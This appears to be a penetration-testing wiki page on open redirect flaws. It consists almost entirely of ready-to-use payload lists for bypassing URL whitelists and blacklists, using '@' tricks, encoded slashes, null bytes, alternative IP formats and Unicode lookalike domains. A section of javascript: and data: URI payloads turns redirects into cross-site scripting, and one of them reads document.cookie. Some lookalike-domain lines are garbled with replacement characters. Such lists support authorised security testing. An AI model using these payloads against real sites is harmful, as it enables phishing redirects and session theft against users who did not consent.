# Open Redirect

## Open redirect

### Exploitation

Using a whitelisted domain or keyword

```text
www.whitelisted.com.evil.com redirect to evil.com
https://www.target01.com//example.com/ redirect to //example.com/
https://www.target01.com%09.example.com redirect to example.com
https://www.target01.com%252e.example.com redirect to example.com
```

Using "//" to bypass "http" blacklisted keyword

```text
//google.com
```

Using "https:" to bypass "//" blacklisted keyword

```text
https:google.com
```

Using "//" to bypass "//" blacklisted keyword \(Browsers see // as //\)

```text
\/\/google.com/
/\/google.com/
```

Using "/\" to bypass:

```text
/\google.com
```

Using "%E3%80%82" to bypass "." blacklisted character

```text
//google%E3%80%82com
```

Using null byte "%00" to bypass blacklist filter

```text
//google%00.com
```

Using parameter pollution

```text
?next=whitelisted.com&next=google.com
```

Using "@" character, browser will redirect to anything after the "@"

```text
http://www.theirsite.com@yoursite.com/
```

Creating folder as their domain

```text
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```

XSS from Open URL - If it's in a JS variable

```text
";alert(0);//
```

XSS from data:// wrapper

```text
http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
```

Username

```php
https://www.victim.com@attacker.com
https://www.victim.co%6D@attacker.com
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com
```

IP formats

```php
216.58.215.78 -- Regular
3627734862 -- Decimal
0330.0072.0327.0116 -- Octal
00000330.00000072.00000327.00000116 -- Octal with junk zeros
0xd83ad74e -- Hex
0xd8.0x3a.0xd7.0x4e -- Hex (dot sepparated)
0x000000d8.0x0000003a.0x000000d7.0x0000004e -- Hex (dot sepparated) with junk zeros
```

You can also mix the different IP formats:

![](../.gitbook/assets/image%20%28510%29.png)

You can play with the different IP formats in [https://www.silisoftware.com/tools/ipconverter.php](https://www.silisoftware.com/tools/ipconverter.php)

Parsing

```text
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾
⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗
⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰
⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ
Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ
ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

### Open Redirect to XSS

```bash
#Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

#Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

#Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
```

### More domain bypasses

```text
<>//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
/////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
///\;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//\/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/.Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/\/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
/〱Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
.Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
\/\/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
〱Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ%00｡Ｐⓦ
%01https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
%01https://google.com
////%09/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
///%09/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//%09/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/%09/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
////%09/google.com
///%09/google.com
//%09/google.com
/%09/google.com
////%09/whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
///%09/whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//%09/whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/%09/whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
////%09/whitelisted.com@google.com
///%09/whitelisted.com@google.com
//%09/whitelisted.com@google.com
/%09/whitelisted.com@google.com
&%0d%0a1Location:https://google.com
\152\141\166\141\163\143\162\151\160\164\072alert(1)
%19Jav%09asc%09ript:https%20://whitelisted.com/%250Aconfirm%25281%2529
////216.58.214.206
///216.58.214.206
//216.58.214.206
/\216.58.214.206
/216.58.214.206
216.58.214.206
////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
%2f216.58.214.206//
%2f216.58.214.206
%2f216.58.214.206%2f%2f
////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
//%2f%2fⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/%2f%2fⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
%2f$2f216.58.214.206
$2f%2f216.58.214.206%2f%2f
%2f$2f3627734734
$2f%2f3627734734%2f%2f
//%2f%2fgoogle.com
/%2f%2fgoogle.com
$2f%2fgoogle.com
%2f$2fgoogle.com
$2f%2fgoogle.com%2f%2f
%2f3627734734//
%2f3627734734
%2f3627734734%2f%2f
/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
/%2f%5c%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77/
%2fgoogle.com//
%2fgoogle.com
%2fgoogle.com%2f%2f
////3627734734
///3627734734
//3627734734
/\3627734734
/3627734734
3627734734
//3H6k7lIAiqjfNeN@whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//3H6k7lIAiqjfNeN@whitelisted.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//3H6k7lIAiqjfNeN@whitelisted.com@google.com/
//3H6k7lIAiqjfNeN@whitelisted.com+@google.com/
////%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
///%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
////%5cgoogle.com
///%5cgoogle.com
//%5cgoogle.com
/%5cgoogle.com
////%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
///%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
////%5cwhitelisted.com@google.com
///%5cwhitelisted.com@google.com
//%5cwhitelisted.com@google.com
/%5cwhitelisted.com@google.com
/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
%68%74%74%70%73%3a%2f%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@whitelisted.com/
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@whitelisted.com/
";alert(0);//
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
data:whitelisted.com;text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ%E3%80%82pw
//google%00.com
/\google%252ecom
google%252ecom
<>//google.com
/<>//google.com
//;@google.com
///;@google.com
/////google.com/
/////google.com
////\;@google.com
////google.com//
////google.com/
////google.com
///\;@google.com
///google.com//
///google.com/
///google.com
//\/google.com/
//\google.com
//google.com//
//google.com/
//google.com
/.google.com
/\/\/google.com/
/\/google.com/
/\/google.com
/\google.com
/〱google.com
/google.com
../google.com
.google.com
@google.com
\/\/google.com/
〱google.com
google.com
google.com%23@whitelisted.com
////google.com/%2e%2e
///google.com/%2e%2e
//google.com/%2e%2e
/google.com/%2e%2e
//google.com/%2E%2E
////google.com/%2e%2e%2f
///google.com/%2e%2e%2f
//google.com/%2e%2e%2f
////google.com/%2f..
///google.com/%2f..
//google.com/%2f..
//google.com/%2F..
/google.com/%2F..
////google.com/%2f%2e%2e
///google.com/%2f%2e%2e
//google.com/%2f%2e%2e
/google.com/%2f%2e%2e
//google.com//%2F%2E%2E
//google.com:80?@whitelisted.com/
//google.com:80#@whitelisted.com/
google.com/.jpg
//google.com\twhitelisted.com/
//google.com/whitelisted.com
//google.com\@whitelisted.com
google.com/whitelisted.com
//google%E3%80%82com
/http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/http:/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http://;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http://.Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http:/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http:Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http://00330.00072.0000326.00000316
http:00330.00072.0000326.00000316
http://00330.0x3a.54990
http:00330.0x3a.54990
http://00330.3856078
http:00330.3856078
http://0330.072.0326.0316
http:0330.072.0326.0316
http:%0a%0dⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http:%0a%0dgoogle.com
http://0xd8.072.54990
http:0xd8.072.54990
http://0xd8.0x3a.0xd6.0xce
http:0xd8.0x3a.0xd6.0xce
http://0xd8.3856078
http:0xd8.3856078
http://0xd83ad6ce
http:0xd83ad6ce
http://[::216.58.214.206]
http:[::216.58.214.206]
http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%23.whitelisted.com/
http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%2f%2f.whitelisted.com/
http://3627734734
http:3627734734
http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%3F.whitelisted.com/
http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
http://3H6k7lIAiqjfNeN@00330.0x3a.54990
http:3H6k7lIAiqjfNeN@00330.0x3a.54990
http://3H6k7lIAiqjfNeN@00330.3856078
http:3H6k7lIAiqjfNeN@00330.3856078
http://3H6k7lIAiqjfNeN@0330.072.0326.0316
http:3H6k7lIAiqjfNeN@0330.072.0326.0316
http://3H6k7lIAiqjfNeN@0xd8.072.54990
http:3H6k7lIAiqjfNeN@0xd8.072.54990
http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
http://3H6k7lIAiqjfNeN@0xd8.3856078
http:3H6k7lIAiqjfNeN@0xd8.3856078
http://3H6k7lIAiqjfNeN@0xd83ad6ce
http:3H6k7lIAiqjfNeN@0xd83ad6ce
http://3H6k7lIAiqjfNeN@[::216.58.214.206]
http:3H6k7lIAiqjfNeN@[::216.58.214.206]
http://3H6k7lIAiqjfNeN@3627734734
http:3H6k7lIAiqjfNeN@3627734734
http://3H6k7lIAiqjfNeN@472.314.470.462
http:3H6k7lIAiqjfNeN@472.314.470.462
http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
http://3H6k7lIAiqjfNeN@whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
http://3H6k7lIAiqjfNeN@whitelisted.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
http://3H6k7lIAiqjfNeN@whitelisted.com@google.com/
http://3H6k7lIAiqjfNeN@whitelisted.com+@google.com/
http://472.314.470.462
http:472.314.470.462
http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%5c%5c.whitelisted.com/
/http://%67%6f%6f%67%6c%65%2e%63%6f%6d
http://%67%6f%6f%67%6c%65%2e%63%6f%6d
http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@whitelisted.com/
http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@whitelisted.com/
http://[::ffff:216.58.214.206]
http:[::ffff:216.58.214.206]
/http://google.com
/http:/google.com
http://;@google.com
http://.google.com
http://google.com
http:/\/\google.com
http:/google.com
http:google.com
http://google.com%23.whitelisted.com/
http://google.com%2f%2f.whitelisted.com/
http://google.com%3F.whitelisted.com/
http://google.com%5c%5c.whitelisted.com/
http://google.com:80?@whitelisted.com/
http://google.com:80#@whitelisted.com/
http://google.com\twhitelisted.com/
//https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
/https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https:Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://%09/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/https://%09/google.com
https://%09/google.com
https://%09/whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://%09/whitelisted.com@google.com
https://%0a%0dⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://%0a%0dgoogle.com
//https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
/https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
//https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
/https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
/https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
/https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
https%3a%2f%2fgoogle.com%2f
/https://%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/https:/%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
https://%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https:/%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
/https://%5cgoogle.com
/https:/%5cgoogle.com/
https://%5cgoogle.com
https:/%5cgoogle.com/
/https://%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/https://%5cwhitelisted.com@google.com
https://%5cwhitelisted.com@google.com
https://%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77
//https://google.com//
/https://google.com//
/https://google.com/
/https://google.com
/https:google.com
https://////google.com
https://google.com//
https://google.com/
https://google.com
https:/\google.com
https:google.com
//https:///google.com/%2e%2e
/https://google.com/%2e%2e
https:///google.com/%2e%2e
//https://google.com/%2e%2e%2f
https://google.com/%2e%2e%2f
/https://google.com/%2f..
https://google.com/%2f..
/https:///google.com/%2f%2e%2e
/https://google.com/%2f%2e%2e
https:///google.com/%2f%2e%2e
https://google.com/%2f%2e%2e
https://:@google.com\@whitelisted.com
https://google.com?whitelisted.com
https://google.com/whitelisted.com
https://google.com\whitelisted.com
https://google.com#whitelisted.com
https://google%E3%80%82com
//https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
/https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
https://:@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@whitelisted.com
https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/whitelisted.com
https://whitelisted.com;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
https:///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
//https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
/https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
/https:///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
/https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
https:///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
//https://whitelisted.com@google.com//
/https://whitelisted.com@google.com/
https://whitelisted.com;@google.com
https://whitelisted.com.google.com
https://whitelisted.com@google.com//
https://whitelisted.com@google.com/
https://whitelisted.com@google.com
/https://whitelisted.com@google.com/%2e%2e
https:///whitelisted.com@google.com/%2e%2e
//https://whitelisted.com@google.com/%2e%2e%2f
https://whitelisted.com@google.com/%2e%2e%2f
/https://whitelisted.com@google.com/%2f..
https://whitelisted.com@google.com/%2f..
/https:///whitelisted.com@google.com/%2f%2e%2e
/https://whitelisted.com@google.com/%2f%2e%2e
https:///whitelisted.com@google.com/%2f%2e%2e
https://whitelisted.com@google.com/%2f%2e%2e
/https://whitelisted.com@google.com/%2f.//whitelisted.com@google.com/%2f..
https://whitelisted.com/https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
https://whitelisted.com/https://google.com/
@https://www.google.com
http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\twhitelisted.com/
http://whitelisted.com@00330.00072.0000326.00000316
http:whitelisted.com@00330.00072.0000326.00000316
http://whitelisted.com@00330.0x3a.54990
http:whitelisted.com@00330.0x3a.54990
http://whitelisted.com@00330.3856078
http:whitelisted.com@00330.3856078
http://whitelisted.com@0330.072.0326.0316
http:whitelisted.com@0330.072.0326.0316
http://whitelisted.com@0xd8.072.54990
http:whitelisted.com@0xd8.072.54990
http://whitelisted.com@0xd8.0x3a.0xd6.0xce
http:whitelisted.com@0xd8.0x3a.0xd6.0xce
http://whitelisted.com@0xd8.3856078
http:whitelisted.com@0xd8.3856078
http://whitelisted.com@0xd83ad6ce
http:whitelisted.com@0xd83ad6ce
http://whitelisted.com@[::216.58.214.206]
http:whitelisted.com@[::216.58.214.206]
http://whitelisted.com%2eⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
http://whitelisted.com%2egoogle.com/
http://whitelisted.com@3627734734
http:whitelisted.com@3627734734
http://whitelisted.com@472.314.470.462
http:whitelisted.com@472.314.470.462
http://whitelisted.com:80%40Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
http://whitelisted.com:80%40google.com/
http://whitelisted.com@[::ffff:216.58.214.206]
http:whitelisted.com@[::ffff:216.58.214.206]
http://whitelisted.com@google.com/
http://whitelisted.com+&@google.com#+@whitelisted.com/
http://whitelisted.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@whitelisted.com/
http://www.google.com\.whitelisted.com
http://www.Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\.whitelisted.com
http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
http:XY>.7d8T\205pZM@00330.00072.0000326.00000316
http://XY>.7d8T\205pZM@00330.0x3a.54990
http:XY>.7d8T\205pZM@00330.0x3a.54990
http://XY>.7d8T\205pZM@00330.3856078
http:XY>.7d8T\205pZM@00330.3856078
http://XY>.7d8T\205pZM@0330.072.0326.0316
http:XY>.7d8T\205pZM@0330.072.0326.0316
http://XY>.7d8T\205pZM@0xd8.072.54990
http:XY>.7d8T\205pZM@0xd8.072.54990
http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
http://XY>.7d8T\205pZM@0xd8.3856078
http:XY>.7d8T\205pZM@0xd8.3856078
http://XY>.7d8T\205pZM@0xd83ad6ce
http:XY>.7d8T\205pZM@0xd83ad6ce
http://XY>.7d8T\205pZM@[::216.58.214.206]
http:XY>.7d8T\205pZM@[::216.58.214.206]
http://XY>.7d8T\205pZM@3627734734
